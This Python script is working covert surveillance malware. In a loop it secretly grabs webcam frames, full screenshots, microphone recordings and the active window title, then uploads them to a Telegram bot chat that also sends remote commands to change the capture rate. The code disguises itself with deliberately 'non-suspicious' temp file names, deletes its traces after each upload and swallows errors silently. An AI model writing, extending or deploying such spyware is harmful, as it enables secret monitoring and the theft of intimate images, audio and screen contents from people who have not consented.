import os
import time
import cv2
import sounddevice as sd
from scipy.io import wavfile
import requests
from dotenv import load_dotenv
from PIL import ImageGrab
import numpy as np
import tempfile

# Platform specific imports
try:
    import pygetwindow as gw
except ImportError:
    gw = None

load_dotenv()

# Configuration
TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
TOPIC_WEBCAM = os.getenv("TOPIC_WEBCAM")
TOPIC_SCREENSHOT = os.getenv("TOPIC_SCREENSHOT")
TOPIC_AUDIO = os.getenv("TOPIC_AUDIO")
TOPIC_GENERAL = os.getenv("TOPIC_GENERAL")

INTERVAL = 60  # Default 60 seconds
AUDIO_DURATION = 5  
SAMPLE_RATE = 44100
LAST_UPDATE_ID = 0

def get_temp_path(filename):
    return os.path.join(tempfile.gettempdir(), filename)

def get_active_window():
    if gw:
        try:
            window = gw.getActiveWindow()
            return window.title if window else "Unknown"
        except Exception:
            return "Error retrieving window"
    return "Non-Windows Environment"

def update_remote_config():
    global INTERVAL, LAST_UPDATE_ID
    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
    try:
        # Check for new commands from the authorized chat
        params = {"offset": LAST_UPDATE_ID + 1, "timeout": 0}
        resp = requests.get(url, params=params, timeout=5).json()
        if resp.get("ok"):
            for update in resp.get("result", []):
                LAST_UPDATE_ID = update["update_id"]
                msg = update.get("message", {})
                text = msg.get("text", "").strip()
                
                # Check if message is from the authorized group/chat
                if str(msg.get("chat", {}).get("id")) == str(CHAT_ID):
                    if text.isdigit():
                        new_val = int(text)
                        # Limit interval between 10 seconds and 1 hour
                        if 10 <= new_val <= 3600:
                            INTERVAL = new_val
                            # Send confirmation back to Telegram
                            conf_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
                            conf_payload = {
                                "chat_id": CHAT_ID,
                                "text": f"✅ Service interval updated to {INTERVAL} seconds.",
                                "message_thread_id": TOPIC_GENERAL
                            }
                            try:
                                requests.post(conf_url, data=conf_payload)
                            except Exception:
                                pass
    except Exception:
        pass

def capture_webcam(filename):
    cam = cv2.VideoCapture(0)
    if not cam.isOpened():
        return False
    
    # Allow camera to warm up
    time.sleep(0.5)
    ret, frame = cam.read()
    if ret:
        # Encode as JPG manually since filename has no .jpg extension
        _, buffer = cv2.imencode('.jpg', frame)
        buffer.tofile(filename)
    
    cam.release()
    return ret

def capture_screenshot(filename):
    try:
        screenshot = ImageGrab.grab()
        # Force JPEG format since filename has no .jpg extension
        screenshot.save(filename, format='JPEG')
        return True
    except Exception:
        return False

def capture_audio(filename):
    try:
        recording = sd.rec(int(AUDIO_DURATION * SAMPLE_RATE), samplerate=SAMPLE_RATE, channels=1)
        sd.wait()
        wavfile.write(filename, SAMPLE_RATE, recording)
        return True
    except Exception:
        return False

def send_to_telegram(window_title, webcam_file, screen_file, audio_file):
    url_photo = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    url_doc = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    
    caption = f"Context: {window_title}"
    
    def post_data(url, data_type, topic_id, extra_data, files):
        payload = {
            "chat_id": CHAT_ID,
            "caption": extra_data
        }
        if topic_id:
            payload["message_thread_id"] = topic_id
            
        try:
            resp = requests.post(url, data=payload, files=files)
            result = resp.json()
            if not result.get("ok"):
                # Fallback for General topic if thread ID 1 is rejected
                if topic_id == "1":
                    del payload["message_thread_id"]
                    requests.post(url, data=payload, files=files)
        except Exception:
            pass

    # Send Screenshot to TOPIC_SCREENSHOT
    if os.path.exists(screen_file):
        with open(screen_file, "rb") as f:
            post_data(url_photo, "photo", TOPIC_SCREENSHOT, f"LOG_S\n{caption}", {"photo": f})
            
    # Send Webcam to TOPIC_WEBCAM
    if os.path.exists(webcam_file):
        with open(webcam_file, "rb") as f:
            post_data(url_photo, "photo", TOPIC_WEBCAM, f"LOG_W\n{caption}", {"photo": f})

    # Send Audio to TOPIC_AUDIO
    if os.path.exists(audio_file):
        with open(audio_file, "rb") as f:
            post_data(url_doc, "document", TOPIC_AUDIO, f"LOG_A\n{caption}", {"document": f})

def main():
    if not TOKEN or not CHAT_ID:
        return

    # Non-suspicious temporary file names
    webcam_file = get_temp_path("idx_01.tmp")
    screen_file = get_temp_path("idx_02.tmp")
    audio_file = get_temp_path("idx_03.tmp")

    try:
        while True:
            # Check for remote interval updates
            update_remote_config()

            window_title = get_active_window()
            
            # Capture all data points
            capture_webcam(webcam_file)
            capture_screenshot(screen_file)
            capture_audio(audio_file)
            
            # Send to Telegram
            send_to_telegram(window_title, webcam_file, screen_file, audio_file)
            
            # Cleanup temp files
            for f in [webcam_file, screen_file, audio_file]:
                if os.path.exists(f):
                    try:
                        os.remove(f)
                    except Exception:
                        pass
            
            time.sleep(INTERVAL)
            
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()
